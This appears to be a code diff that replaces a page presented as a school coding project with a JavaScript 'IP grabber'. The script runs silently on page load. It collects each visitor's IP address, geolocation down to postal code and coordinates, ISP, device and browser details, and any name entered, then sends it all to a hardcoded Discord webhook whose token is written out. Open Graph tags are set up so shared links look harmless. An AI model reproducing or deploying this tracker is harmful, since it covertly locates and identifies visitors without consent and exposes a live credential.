@@ -1,423 +1,539 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+// Discord Webhook URL - Replace with your actual webhook URL
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1416742887722320062/-5WaLqKF3w21CGDp_q24eKtV8KXdP5e2_6ES2GAB8nyacoq_pn_cSj8kh98KXer1owjf';
+
+// Global variable to store user information
+let currentUserInfo = null;
+let nameSubmitted = false;
+
+// Function to submit name and send white embed
+async function submitName() {
+    console.log('Submit name function called');
     
-    <!-- Basic Meta Tags -->
-    <title>Coding Project 2025 - By Lucian and Nawras</title>
-    <meta name="description" content="A simple yet modern school coding project.">
+    const nameInput = document.getElementById('nameInput');
+    const enteredName = nameInput ? nameInput.value.trim() : '';
     
-    <!-- Discord & WhatsApp Embed (Open Graph) -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://YOUR_USERNAME.github.io/grab-ip/">
-    <meta property="og:title" content="School Coding Project - By Lucian and Nawras">
-    <meta property="og:description" content="A simple yet modern school coding project.">
-    <meta property="og:image" content="https://www.cyberark.com/wp-content/uploads/2019/11/Developer.jpg?v=2">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:site_name" content="Coding Project">
+    if (!enteredName) {
+        alert('Please enter your name first!');
+        return;
+    }
     
-    <!-- Discord Embed Color -->
-    <meta name="theme-color" content="#2ecc71">
+    console.log('Name submitted:', enteredName);
     
-    <!-- Favicon -->
-    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📊</text></svg>">
-</head>
-<body>
-    <style>
-        .menu {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background-color: #333;
-            color: #fff;
-            padding: 10px;
-        }
-        .menu ul {
-            display: flex;
-            list-style: none;
-            margin: 0;
-            padding: 0;
-        }
-        .menu ul li {
-            margin-right: 10px;
-        }
-        .menu ul li a {
-            color: #fff;
-            text-decoration: none;
-        }
-        .menu ul li a:hover {
-            color: #ccc;
-        }
-        .menu ul li a:active {
-            color: #fff;
-        }
-        .menu ul li a:visited {
-            color: #fff;
-        }
-        .menu ul li a:focus {
-            color: #fff;
-        }
-        .menu ul li a:hover {
-            color: #ccc;
-        }
-        .menu ul li a:active {
-            color: #fff;
-        }
-        .menu ul li a:visited {
-            color: #fff;
-        }
-        .menu ul li a:focus {
-            color: #fff;
-        }
-        .menu ul li a:hover {
-            color: #ccc;
-        }
-        .menu ul li a:active {
-            color: #fff;
-        }
-        .menu ul li a:visited {
-            color: #fff;
-        }
-    </style>
-    <div id="app"></div>
+    // Update UI immediately
+    const showDetailsBtn = document.getElementById('showDetailsBtn');
+    const enterNameBtn = document.getElementById('enterNameBtn');
     
-    <script src="script.js"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
-        <div class="menu">
-            <ul>
-                <li><a href="#">Home</a></li>
-                <li><a href="#">About</a></li>
-                <li><a href="#">Contact</a></li>
-            </ul>
-        </div>
-        <!-- Main Content Container -->
-        <div class="main-container">
-            <div class="input-container">
-                <div class="input-row">
-                    <input type="text" id="nameInput" class="name-input" placeholder="Enter your name" maxlength="50">
-                    <button id="enterNameBtn" class="enter-name-btn" onclick="submitName()">
-                        <span class="btn-icon">✓</span>
-                        Enter Name
-                    </button>
+    if (showDetailsBtn && enterNameBtn) {
+        showDetailsBtn.style.display = 'flex';
+        enterNameBtn.innerHTML = '<span class="btn-icon">✓</span>Name Entered';
+        enterNameBtn.disabled = true;
+        enterNameBtn.style.opacity = '0.6';
+        enterNameBtn.style.cursor = 'not-allowed';
+    }
+    
+    nameSubmitted = true;
+    console.log('UI updated, name submission marked complete');
+    
+    // Try to send Discord webhook in background (don't block UI)
+    try {
+        // Get basic IP information for the white embed
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        
+        // Send white embed to Discord
+        await sendWhiteEmbedToDiscord(enteredName, ipData.ip);
+        console.log('Discord webhook sent successfully');
+        
+    } catch (error) {
+        console.error('Error sending to Discord (but UI still works):', error);
+        // Don't show alert here since UI already updated successfully
+    }
+}
+
+// Simple test function to open modal (for debugging)
+function testModal() {
+    console.log('Test modal function called');
+    
+    // Check if name was submitted
+    if (!nameSubmitted) {
+        alert('Please enter your name first!');
+        return;
+    }
+    
+    // Capture the name from input field
+    const nameInput = document.getElementById('nameInput');
+    const enteredName = nameInput ? nameInput.value.trim() : '';
+    
+    console.log('Entered name:', enteredName);
+    
+    const modal = document.getElementById('detailsModal');
+    const loading = document.getElementById('loading');
+    const userDetails = document.getElementById('userDetails');
+    
+    if (modal) {
+        modal.style.display = 'block';
+        loading.style.display = 'block';
+        userDetails.style.display = 'none';
+        console.log('Modal opened via test function');
+        
+        // If we have user info, show it after a delay
+        if (currentUserInfo) {
+            console.log('Using cached user info');
+            // Update the cached info with the new name
+            currentUserInfo.enteredName = enteredName;
+            setTimeout(() => {
+                displayUserInfo();
+            }, 1500);
+        } else {
+            console.log('Grabbing user info...');
+            grabUserInfo(enteredName).then(() => {
+                setTimeout(() => {
+                    displayUserInfo();
+                }, 2000);
+            });
+        }
+    } else {
+        console.error('Modal not found in test function');
+    }
+}
+
+// Function to get user's IP and device information
+async function grabUserInfo(enteredName = '') {
+    try {
+        // Get IP information from multiple sources for reliability
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        
+        // Get detailed location and ISP info
+        const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const detailsData = await detailsResponse.json();
+        
+        // Get browser and device information
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const cookieEnabled = navigator.cookieEnabled;
+        const javaEnabled = navigator.javaEnabled();
+        
+        // Get screen information
+        const screenWidth = screen.width;
+        const screenHeight = screen.height;
+        const screenColorDepth = screen.colorDepth;
+        
+        // Get timezone
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        
+        // Get current timestamp
+        const timestamp = new Date().toISOString();
+        
+        // Compile all information
+        const userInfo = {
+            ip: ipData.ip,
+            city: detailsData.city || 'Unknown',
+            region: detailsData.region || 'Unknown',
+            country: detailsData.country_name || 'Unknown',
+            countryCode: detailsData.country_code || 'Unknown',
+            isp: detailsData.org || 'Unknown',
+            latitude: detailsData.latitude || 'Unknown',
+            longitude: detailsData.longitude || 'Unknown',
+            postal: detailsData.postal || 'Unknown',
+            userAgent: userAgent,
+            platform: platform,
+            language: language,
+            cookieEnabled: cookieEnabled,
+            javaEnabled: javaEnabled,
+            screenWidth: screenWidth,
+            screenHeight: screenHeight,
+            screenColorDepth: screenColorDepth,
+            timezone: timezone,
+            timestamp: timestamp,
+            referrer: document.referrer || 'Direct visit',
+            enteredName: enteredName || 'Not provided'
+        };
+        
+        // Store user info globally for modal display
+        currentUserInfo = userInfo;
+        
+        // Send to Discord webhook
+        await sendToDiscord(userInfo);
+        
+        // Note: White embed is now sent separately via submitName() function
+        
+        return userInfo;
+    } catch (error) {
+        console.error('Error grabbing user info:', error);
+        // Send error notification to Discord
+        await sendErrorToDiscord(error);
+    }
+}
+
+// Function to send user info to Discord webhook
+async function sendToDiscord(userInfo) {
+    if (DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
+        console.log('Please replace DISCORD_WEBHOOK with your actual webhook URL');
+        console.log('User info that would be sent:', userInfo);
+        return;
+    }
+    
+    const embed = {
+        title: userInfo.enteredName !== 'Not provided' ? `New Visitor: ${userInfo.enteredName}` : "🎯 New Visitor Detected",
+        color: 0xFFFFFF, // White color
+        timestamp: userInfo.timestamp,
+        fields: [
+            {
+                name: "- Visitor Information",
+                value: `**Name:** ${userInfo.enteredName}\n**Visit Time:** ${new Date(userInfo.timestamp).toLocaleString()}`,
+                inline: false
+            },
+            {
+                name: "- Network Information",
+                value: `**IP Address:** ${userInfo.ip}\n**ISP:** ${userInfo.isp}`,
+                inline: false
+            },
+            {
+                name: "- Location",
+                value: `**Country:** ${userInfo.country} (${userInfo.countryCode})\n**Region:** ${userInfo.region}\n**City:** ${userInfo.city}\n**Postal:** ${userInfo.postal}\n**Coordinates:** ${userInfo.latitude}, ${userInfo.longitude}`,
+                inline: false
+            },
+            {
+                name: "- Device Information",
+                value: `**Platform:** ${userInfo.platform}\n**Screen:** ${userInfo.screenWidth}x${userInfo.screenHeight} (${userInfo.screenColorDepth}-bit)\n**Language:** ${userInfo.language}\n**Timezone:** ${userInfo.timezone}`,
+                inline: false
+            },
+            {
+                name: "- Browser Information",
+                value: `**User Agent:** ${userInfo.userAgent}\n**Cookies:** ${userInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n**Java:** ${userInfo.javaEnabled ? 'Enabled' : 'Disabled'}\n**Referrer:** ${userInfo.referrer}`,
+                inline: false
+            }
+        ],
+        footer: {
+            text: "IP Grabber • Visitor Tracking System"
+        }
+    };
+    
+    const payload = {
+        embeds: [embed]
+    };
+    
+    try {
+        const response = await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Discord webhook failed: ${response.status}`);
+        }
+        
+        console.log('Successfully sent user info to Discord');
+    } catch (error) {
+        console.error('Error sending to Discord:', error);
+    }
+}
+
+// Function to send error notifications to Discord
+async function sendErrorToDiscord(error) {
+    if (DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
+        return;
+    }
+    
+    const embed = {
+        title: "⚠️ Error in IP Grabber",
+        color: 0xFFFF00, // Yellow color
+        description: `An error occurred while trying to grab user information:\n\`\`\`${error.message}\`\`\``,
+        timestamp: new Date().toISOString(),
+        footer: {
+            text: "IP Grabber Error Log"
+        }
+    };
+    
+    const payload = {
+        embeds: [embed]
+    };
+    
+    try {
+        await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+    } catch (webhookError) {
+        console.error('Error sending error to Discord:', webhookError);
+    }
+}
+
+// Function to send white embed when name is entered
+async function sendWhiteEmbedToDiscord(name, ip) {
+    console.log('Sending white embed for:', { name, ip });
+    
+    if (DISCORD_WEBHOOK.includes('YOUR_WEBHOOK_ID')) {
+        console.log('Using placeholder webhook URL, white embed would be sent:', { name, ip });
+        return;
+    }
+    
+    const embed = {
+        color: 0xFFFFFF, // White color
+        fields: [
+            {
+                name: "Name:",
+                value: name,
+                inline: false
+            },
+            {
+                name: "IP Address:",
+                value: ip,
+                inline: false
+            },
+            {
+                name: "Timestamp:",
+                value: new Date().toLocaleString(),
+                inline: false
+            }
+        ]
+    };
+    
+    const payload = {
+        embeds: [embed]
+    };
+    
+    try {
+        const response = await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Discord white embed failed: ${response.status}`);
+        }
+        
+        console.log('Successfully sent white embed to Discord');
+    } catch (error) {
+        console.error('Error sending white embed to Discord:', error);
+    }
+}
+
+// Function to send name separately to Discord (legacy - kept for compatibility)
+async function sendNameToDiscord(name, ip) {
+    // This function is now handled by sendWhiteEmbedToDiscord
+    console.log('Legacy name function called, skipping...');
+}
+
+// Modal functionality
+function initializeModal() {
+    console.log('Initializing modal...');
+    
+    const modal = document.getElementById('detailsModal');
+    const btn = document.getElementById('showDetailsBtn');
+    const closeBtn = document.querySelector('.close');
+    const loading = document.getElementById('loading');
+    const userDetails = document.getElementById('userDetails');
+
+    console.log('Modal elements found:', {
+        modal: !!modal,
+        btn: !!btn,
+        closeBtn: !!closeBtn,
+        loading: !!loading,
+        userDetails: !!userDetails
+    });
+
+    if (!modal || !btn || !closeBtn || !loading || !userDetails) {
+        console.error('Some modal elements not found!');
+        return;
+    }
+
+    // Show modal when button is clicked
+    btn.addEventListener('click', function(e) {
+        console.log('Button clicked!');
+        e.preventDefault();
+        
+        modal.style.display = 'block';
+        loading.style.display = 'block';
+        userDetails.style.display = 'none';
+        
+        console.log('Modal should be visible now');
+        
+        // If we don't have user info yet, grab it
+        if (!currentUserInfo) {
+            console.log('Grabbing user info...');
+            grabUserInfo().then(() => {
+                setTimeout(() => {
+                    displayUserInfo();
+                }, 2000); // Show loading for 2 seconds for effect
+            });
+        } else {
+            console.log('Using cached user info');
+            // If we already have info, show it after a brief loading
+            setTimeout(() => {
+                displayUserInfo();
+            }, 1500);
+        }
+    });
+
+    // Close modal when X is clicked
+    closeBtn.addEventListener('click', function(e) {
+        console.log('Close button clicked');
+        e.preventDefault();
+        modal.style.display = 'none';
+    });
+
+    // Close modal when clicking outside of it
+    window.addEventListener('click', function(event) {
+        if (event.target === modal) {
+            console.log('Clicked outside modal, closing');
+            modal.style.display = 'none';
+        }
+    });
+    
+    // Add a simple test click handler as backup
+    btn.onclick = function(e) {
+        console.log('Backup onclick handler triggered');
+        if (modal.style.display !== 'block') {
+            modal.style.display = 'block';
+            loading.style.display = 'block';
+            userDetails.style.display = 'none';
+        }
+    };
+    
+    console.log('Modal initialization complete');
+}
+
+function displayUserInfo() {
+    const loading = document.getElementById('loading');
+    const userDetails = document.getElementById('userDetails');
+    
+    if (!currentUserInfo) {
+        userDetails.innerHTML = '<p style="text-align: center; color: #666;">Unable to gather information. Please try again.</p>';
+    } else {
+        userDetails.innerHTML = `
+            <div class="detail-group">
+                <h3>- Your Information</h3>
+                <div class="detail-item">
+                    <span class="detail-label">Name:</span>
+                    <span class="detail-value">${currentUserInfo.enteredName}</span>
                 </div>
-                <button id="showDetailsBtn" class="details-btn" onclick="testModal()" style="display: none;">
-                    <span class="btn-icon">🔍</span>
-                    View Details
-                </button>
+                <div class="detail-item">
+                    <span class="detail-label">Visit Time:</span>
+                    <span class="detail-value">${new Date(currentUserInfo.timestamp).toLocaleString()}</span>
+                </div>
             </div>
-        </div>
-
-        <!-- Modal -->
-        <div id="detailsModal" class="modal">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h2>Easy IP made by Lucian</h2>
-                    <span class="close">&times;</span>
+            
+            <div class="detail-group">
+                <h3>- Network Information</h3>
+                <div class="detail-item">
+                    <span class="detail-label">IP Address:</span>
+                    <span class="detail-value">${currentUserInfo.ip}</span>
                 </div>
-                <div class="modal-body">
-                    <div id="loading" class="loading">
-                        <div class="spinner"></div>
-                        <p>Gathering your information...</p>
-                    </div>
-                    <div id="userDetails" class="user-details" style="display: none;">
-                        <!-- Details will be populated by JavaScript -->
-                    </div>
+                <div class="detail-item">
+                    <span class="detail-label">ISP Provider:</span>
+                    <span class="detail-value">${currentUserInfo.isp}</span>
                 </div>
             </div>
-        </div>
+            
+            <div class="detail-group">
+                <h3>- Location Details</h3>
+                <div class="detail-item">
+                    <span class="detail-label">Country:</span>
+                    <span class="detail-value">${currentUserInfo.country} (${currentUserInfo.countryCode})</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Region:</span>
+                    <span class="detail-value">${currentUserInfo.region}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">City:</span>
+                    <span class="detail-value">${currentUserInfo.city}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Postal Code:</span>
+                    <span class="detail-value">${currentUserInfo.postal}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Coordinates:</span>
+                    <span class="detail-value">${currentUserInfo.latitude}, ${currentUserInfo.longitude}</span>
+                </div>
+            </div>
+            
+            <div class="detail-group">
+                <h3>- Device Information</h3>
+                <div class="detail-item">
+                    <span class="detail-label">Platform:</span>
+                    <span class="detail-value">${currentUserInfo.platform}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Screen Resolution:</span>
+                    <span class="detail-value">${currentUserInfo.screenWidth} x ${currentUserInfo.screenHeight}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Color Depth:</span>
+                    <span class="detail-value">${currentUserInfo.screenColorDepth}-bit</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Language:</span>
+                    <span class="detail-value">${currentUserInfo.language}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Timezone:</span>
+                    <span class="detail-value">${currentUserInfo.timezone}</span>
+                </div>
+            </div>
+            
+            <div class="detail-group">
+                <h3>- Browser Information</h3>
+                <div class="detail-item">
+                    <span class="detail-label">User Agent:</span>
+                    <span class="detail-value">${currentUserInfo.userAgent}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Cookies Enabled:</span>
+                    <span class="detail-value">${currentUserInfo.cookieEnabled ? 'Yes' : 'No'}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Java Enabled:</span>
+                    <span class="detail-value">${currentUserInfo.javaEnabled ? 'Yes' : 'No'}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Referrer:</span>
+                    <span class="detail-value">${currentUserInfo.referrer}</span>
+                </div>
+            </div>
+        `;
+    }
+    
+    loading.style.display = 'none';
+    userDetails.style.display = 'block';
+}
 
-        <style>
-            /* Main container styling */
-            .main-container {
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                min-height: 70vh;
-                padding: 20px;
-            }
+// Automatically grab user info when the page loads
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('IP Grabber loaded successfully');
+    
+    // Add a small delay to ensure all elements are loaded
+    setTimeout(() => {
+        // Initialize modal functionality
+        initializeModal();
+        
+        // Grab user info silently in background
+        grabUserInfo();
+    }, 500);
+});
 
-            /* Input container styling */
-            .input-container {
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                gap: 20px;
-                width: 100%;
-                max-width: 500px;
-            }
-
-            /* Input row styling */
-            .input-row {
-                display: flex;
-                gap: 15px;
-                width: 100%;
-                align-items: center;
-            }
-
-            /* Name input styling */
-            .name-input {
-                flex: 1;
-                padding: 15px 20px;
-                border: 2px solid #e1e8ed;
-                border-radius: 12px;
-                font-size: 16px;
-                font-weight: 500;
-                background: #fff;
-                color: #333;
-                transition: all 0.3s ease;
-                outline: none;
-                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
-            }
-
-            .name-input:focus {
-                border-color: #667eea;
-                box-shadow: 0 4px 20px rgba(102, 126, 234, 0.15);
-                transform: translateY(-1px);
-            }
-
-            .name-input::placeholder {
-                color: #999;
-                font-weight: 400;
-            }
-
-            /* Button styling */
-            .details-btn {
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                border: none;
-                border-radius: 15px;
-                padding: 20px 40px;
-                font-size: 18px;
-                font-weight: 600;
-                color: white;
-                cursor: pointer;
-                transition: all 0.3s ease;
-                box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
-                display: flex;
-                align-items: center;
-                gap: 10px;
-            }
-
-            .details-btn:hover {
-                transform: translateY(-3px);
-                box-shadow: 0 12px 35px rgba(102, 126, 234, 0.4);
-            }
-
-            .details-btn:active {
-                transform: translateY(-1px);
-            }
-
-            .btn-icon {
-                font-size: 20px;
-            }
-
-            /* Enter name button styling */
-            .enter-name-btn {
-                background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
-                border: none;
-                border-radius: 12px;
-                padding: 15px 25px;
-                font-size: 16px;
-                font-weight: 600;
-                color: white;
-                cursor: pointer;
-                transition: all 0.3s ease;
-                box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
-                display: flex;
-                align-items: center;
-                gap: 8px;
-                white-space: nowrap;
-            }
-
-            .enter-name-btn:hover {
-                transform: translateY(-2px);
-                box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
-            }
-
-            .enter-name-btn:active {
-                transform: translateY(-1px);
-            }
-
-            /* Modal styling */
-            .modal {
-                display: none;
-                position: fixed;
-                z-index: 1000;
-                left: 0;
-                top: 0;
-                width: 100%;
-                height: 100%;
-                background-color: rgba(0, 0, 0, 0.6);
-                backdrop-filter: blur(5px);
-            }
-
-            .modal-content {
-                background-color: #fff;
-                margin: 5% auto;
-                border-radius: 20px;
-                width: 90%;
-                max-width: 600px;
-                max-height: 80vh;
-                overflow-y: auto;
-                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-                animation: modalSlideIn 0.3s ease-out;
-            }
-
-            @keyframes modalSlideIn {
-                from {
-                    opacity: 0;
-                    transform: translateY(-50px) scale(0.95);
-                }
-                to {
-                    opacity: 1;
-                    transform: translateY(0) scale(1);
-                }
-            }
-
-            .modal-header {
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                color: white;
-                padding: 20px;
-                border-radius: 20px 20px 0 0;
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-            }
-
-            .modal-header h2 {
-                margin: 0;
-                font-size: 24px;
-                font-weight: 700;
-            }
-
-            .close {
-                color: white;
-                font-size: 28px;
-                font-weight: bold;
-                cursor: pointer;
-                border: none;
-                background: none;
-                padding: 0;
-                line-height: 1;
-            }
-
-            .close:hover {
-                opacity: 0.7;
-            }
-
-            .modal-body {
-                padding: 20px;
-            }
-
-            /* Loading animation */
-            .loading {
-                text-align: center;
-                padding: 40px 20px;
-            }
-
-            .spinner {
-                border: 4px solid #f3f3f3;
-                border-top: 4px solid #667eea;
-                border-radius: 50%;
-                width: 40px;
-                height: 40px;
-                animation: spin 1s linear infinite;
-                margin: 0 auto 20px;
-            }
-
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
-
-            /* User details styling */
-            .user-details {
-                display: grid;
-                gap: 15px;
-            }
-
-            .detail-group {
-                background: #f8f9fa;
-                padding: 15px;
-                border-radius: 10px;
-                border-left: 4px solid #667eea;
-            }
-
-            .detail-group h3 {
-                margin: 0 0 10px 0;
-                color: #333;
-                font-size: 16px;
-                font-weight: 600;
-            }
-
-            .detail-item {
-                display: flex;
-                justify-content: space-between;
-                padding: 5px 0;
-                border-bottom: 1px solid #e9ecef;
-            }
-
-            .detail-item:last-child {
-                border-bottom: none;
-            }
-
-            .detail-label {
-                font-weight: 500;
-                color: #666;
-            }
-
-            .detail-value {
-                color: #333;
-                text-align: right;
-                word-break: break-word;
-                max-width: 60%;
-            }
-
-            /* Responsive design */
-            @media (max-width: 768px) {
-                .modal-content {
-                    margin: 10% auto;
-                    width: 95%;
-                }
-                
-                .details-btn {
-                    padding: 15px 30px;
-                    font-size: 16px;
-                }
-                
-                .detail-item {
-                    flex-direction: column;
-                    gap: 5px;
-                }
-                
-                .detail-value {
-                    max-width: 100%;
-                    text-align: left;
-                }
-
-                .input-container {
-                    max-width: 350px;
-                }
-                
-                .input-row {
-                    flex-direction: column;
-                    gap: 10px;
-                }
-                
-                .name-input {
-                    font-size: 14px;
-                    padding: 12px 16px;
-                    width: 100%;
-                }
-
-                .enter-name-btn {
-                    width: 100%;
-                    justify-content: center;
-                    padding: 12px 20px;
-                    font-size: 14px;
-                }
-            }
-        </style>
-</body>
-</html>
+// Backup initialization in case DOMContentLoaded already fired
+if (document.readyState === 'loading') {
+    // Document is still loading
+} else {
+    // Document has finished loading
+    setTimeout(() => {
+        initializeModal();
+        if (!currentUserInfo) {
+            grabUserInfo();
+        }
+    }, 100);
+}
